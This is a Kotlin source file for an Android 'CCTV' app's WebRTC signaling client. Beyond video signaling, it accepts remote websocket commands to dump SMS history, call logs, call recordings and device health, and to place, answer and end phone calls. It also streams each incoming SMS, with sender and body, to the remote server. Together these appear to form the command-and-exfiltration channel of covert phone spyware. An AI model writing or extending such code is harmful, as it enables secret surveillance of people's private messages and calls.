package com.cctv.android.webrtc

import android.os.Handler
import android.os.Looper
import android.util.Log
import okhttp3.*
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class SignalingClient(
    private val serverUrl: String,
    private val roomId: String,
    private val listener: Listener
) {
    private val TAG = "SignalingClient"
    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .pingInterval(25, TimeUnit.SECONDS)
        .build()

    private var webSocket: WebSocket? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    private var isConnected = false
    private var shouldReconnect = true

    interface Listener {
        fun onConnected()
        fun onDisconnected()
        fun onJoined(roomId: String, peerId: String, existingPeers: List<PeerInfo>)
        fun onPeerJoined(peerId: String, role: String)
        fun onPeerLeft(peerId: String, remainingPeers: Int)
        fun onOfferReceived(fromPeerId: String, sdp: String)
        fun onAnswerReceived(fromPeerId: String, sdp: String)
        fun onCandidateReceived(fromPeerId: String, candidate: String, sdpMid: String?, sdpMLineIndex: Int)
        fun onCommandReceived(fromPeerId: String, action: String, payload: JSONObject?)
        fun onGetSmsHistoryReceived(fromPeerId: String)
        fun onGetDeviceHealthReceived(fromPeerId: String)
        fun onMakeCallReceived(number: String)
        fun onEndCallReceived()
        fun onAnswerCallReceived()
        fun onToggleSpeakerphoneReceived(enabled: Boolean)
        fun onGetCallLogsReceived(fromPeerId: String)
        fun onGetRecordingsReceived(fromPeerId: String)
        fun onIceConfigReceived(iceServers: List<IceServerConfig>)
        fun onError(message: String)
    }

    data class PeerInfo(val peerId: String, val role: String)
    data class IceServerConfig(val urls: List<String>, val username: String?, val credential: String?)

    fun connect() {
        shouldReconnect = true
        val request = Request.Builder().url(serverUrl).build()
        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(ws: WebSocket, response: Response) {
                isConnected = true
                Log.i(TAG, "Signaling WebSocket Opened")
                mainHandler.post { listener.onConnected() }

                // Join room as camera
                val joinMsg = JSONObject().apply {
                    put("type", "join")
                    put("roomId", roomId)
                    put("role", "camera")
                }
                ws.send(joinMsg.toString())

                // Request STUN/TURN config
                val iceConfigMsg = JSONObject().apply {
                    put("type", "get_ice_config")
                }
                ws.send(iceConfigMsg.toString())
            }

            override fun onMessage(ws: WebSocket, text: String) {
                try {
                    val json = JSONObject(text)
                    val type = json.optString("type")
                    val fromPeerId = json.optString("fromPeerId")

                    when (type) {
                        "joined" -> {
                            val peerId = json.optString("peerId")
                            val peersArray = json.optJSONArray("peers") ?: JSONArray()
                            val peersList = mutableListOf<PeerInfo>()
                            for (i in 0 until peersArray.length()) {
                                val p = peersArray.getJSONObject(i)
                                peersList.add(PeerInfo(p.optString("peerId"), p.optString("role")))
                            }
                            mainHandler.post { listener.onJoined(roomId, peerId, peersList) }
                        }
                        "peer_joined" -> {
                            val peerId = json.optString("peerId")
                            val role = json.optString("role")
                            mainHandler.post { listener.onPeerJoined(peerId, role) }
                        }
                        "peer_left" -> {
                            val peerId = json.optString("peerId")
                            val remainingPeers = json.optInt("remainingPeers", 0)
                            mainHandler.post { listener.onPeerLeft(peerId, remainingPeers) }
                        }
                        "offer" -> {
                            val payload = json.optJSONObject("payload")
                            val sdp = payload?.optString("sdp") ?: ""
                            mainHandler.post { listener.onOfferReceived(fromPeerId, sdp) }
                        }
                        "answer" -> {
                            val payload = json.optJSONObject("payload")
                            val sdp = payload?.optString("sdp") ?: ""
                            mainHandler.post { listener.onAnswerReceived(fromPeerId, sdp) }
                        }
                        "candidate" -> {
                            val payload = json.optJSONObject("payload")
                            val candidate = payload?.optString("candidate") ?: ""
                            val sdpMid = payload?.optString("sdpMid")
                            val sdpMLineIndex = payload?.optInt("sdpMLineIndex", 0) ?: 0
                            mainHandler.post {
                                listener.onCandidateReceived(fromPeerId, candidate, sdpMid, sdpMLineIndex)
                            }
                        }
                        "command" -> {
                            val payload = json.optJSONObject("payload")
                            val action = payload?.optString("action") ?: ""
                            mainHandler.post { listener.onCommandReceived(fromPeerId, action, payload) }
                        }
                        "get_sms_history" -> {
                            mainHandler.post { listener.onGetSmsHistoryReceived(fromPeerId) }
                        }
                        "get_device_health" -> {
                            mainHandler.post { listener.onGetDeviceHealthReceived(fromPeerId) }
                        }
                        "make_call" -> {
                            val payload = json.optJSONObject("payload")
                            val num = payload?.optString("number") ?: json.optString("number", "")
                            mainHandler.post { listener.onMakeCallReceived(num) }
                        }
                        "end_call" -> {
                            mainHandler.post { listener.onEndCallReceived() }
                        }
                        "answer_call" -> {
                            mainHandler.post { listener.onAnswerCallReceived() }
                        }
                        "toggle_speakerphone" -> {
                            val payload = json.optJSONObject("payload")
                            val en = payload?.optBoolean("enabled", true) ?: json.optBoolean("enabled", true)
                            mainHandler.post { listener.onToggleSpeakerphoneReceived(en) }
                        }
                        "get_call_logs" -> {
                            mainHandler.post { listener.onGetCallLogsReceived(fromPeerId) }
                        }
                        "get_recordings" -> {
                            mainHandler.post { listener.onGetRecordingsReceived(fromPeerId) }
                        }
                        "ice_config" -> {
                            val serverArray = json.optJSONArray("iceServers") ?: JSONArray()
                            val configs = mutableListOf<IceServerConfig>()
                            for (i in 0 until serverArray.length()) {
                                val item = serverArray.getJSONObject(i)
                                val urlsList = mutableListOf<String>()
                                val urlsOpt = item.opt("urls")
                                if (urlsOpt is JSONArray) {
                                    for (j in 0 until urlsOpt.length()) {
                                        urlsList.add(urlsOpt.getString(j))
                                    }
                                } else if (urlsOpt is String) {
                                    urlsList.add(urlsOpt)
                                }
                                val username = if (item.has("username")) item.getString("username") else null
                                val credential = if (item.has("credential")) item.getString("credential") else null
                                configs.add(IceServerConfig(urlsList, username, credential))
                            }
                            mainHandler.post { listener.onIceConfigReceived(configs) }
                        }
                        "error" -> {
                            val msg = json.optString("message", "Signaling error")
                            mainHandler.post { listener.onError(msg) }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to parse signaling message: $text", e)
                }
            }

            override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                isConnected = false
                Log.e(TAG, "WebSocket connection failed: ${t.message}")
                mainHandler.post { listener.onDisconnected() }
                if (shouldReconnect) {
                    mainHandler.postDelayed({ connect() }, 3000)
                }
            }

            override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                isConnected = false
                Log.i(TAG, "WebSocket closed: $code $reason")
                mainHandler.post { listener.onDisconnected() }
            }
        })
    }

    fun sendOffer(sdp: String, targetPeerId: String? = null) {
        val payload = JSONObject().apply { put("sdp", sdp) }
        sendMessage("offer", payload, targetPeerId)
    }

    fun sendAnswer(sdp: String, targetPeerId: String? = null) {
        val payload = JSONObject().apply { put("sdp", sdp) }
        sendMessage("answer", payload, targetPeerId)
    }

    fun sendCandidate(candidate: String, sdpMid: String?, sdpMLineIndex: Int, targetPeerId: String? = null) {
        val payload = JSONObject().apply {
            put("candidate", candidate)
            put("sdpMid", sdpMid)
            put("sdpMLineIndex", sdpMLineIndex)
        }
        sendMessage("candidate", payload, targetPeerId)
    }

    fun sendSmsReceived(
        address: String,
        name: String = "",
        type: String = "received",
        body: String,
        timestamp: Long,
        dateTime: String? = null
    ) {
        val dt = dateTime ?: java.text.SimpleDateFormat("dd MMM yyyy, hh:mm:ss a", java.util.Locale.getDefault()).format(java.util.Date(timestamp))
        val senderDisplay = if (name.isNotBlank()) "$name ($address)" else address
        val payload = JSONObject().apply {
            put("id", "live_${timestamp}")
            put("address", address)
            put("name", name)
            put("type", type)
            put("sender", senderDisplay)
            put("body", body)
            put("timestamp", timestamp)
            put("dateTime", dt)
        }
        sendMessage("sms_received", payload)
    }

    fun sendSmsHistory(messages: JSONArray, targetPeerId: String? = null) {
        val payload = JSONObject().apply {
            put("messages", messages)
        }
        sendMessage("sms_history", payload, targetPeerId)
    }

    fun sendDeviceHealth(healthData: JSONObject, targetPeerId: String? = null) {
        sendMessage("device_health", healthData, targetPeerId)
    }

    fun sendCallState(state: String, number: String, name: String) {
        val payload = JSONObject().apply {
            put("state", state)
            put("number", number)
            put("name", name)
            put("timestamp", System.currentTimeMillis())
        }
        sendMessage("call_state", payload)
    }

    fun sendCallLogs(logs: JSONArray, targetPeerId: String? = null) {
        val payload = JSONObject().apply {
            put("logs", logs)
        }
        sendMessage("call_logs", payload, targetPeerId)
    }

    fun sendCallRecordings(recordings: JSONArray, targetPeerId: String? = null) {
        val payload = JSONObject().apply {
            put("recordings", recordings)
        }
        sendMessage("call_recordings", payload, targetPeerId)
    }

    private fun sendMessage(type: String, payload: JSONObject, targetPeerId: String? = null) {
        val msg = JSONObject().apply {
            put("type", type)
            put("roomId", roomId)
            put("role", "camera")
            put("payload", payload)
            if (targetPeerId != null) put("targetPeerId", targetPeerId)
        }
        webSocket?.send(msg.toString())
    }

    fun disconnect() {
        shouldReconnect = false
        webSocket?.close(1000, "Normal Closure")
        webSocket = null
    }
}
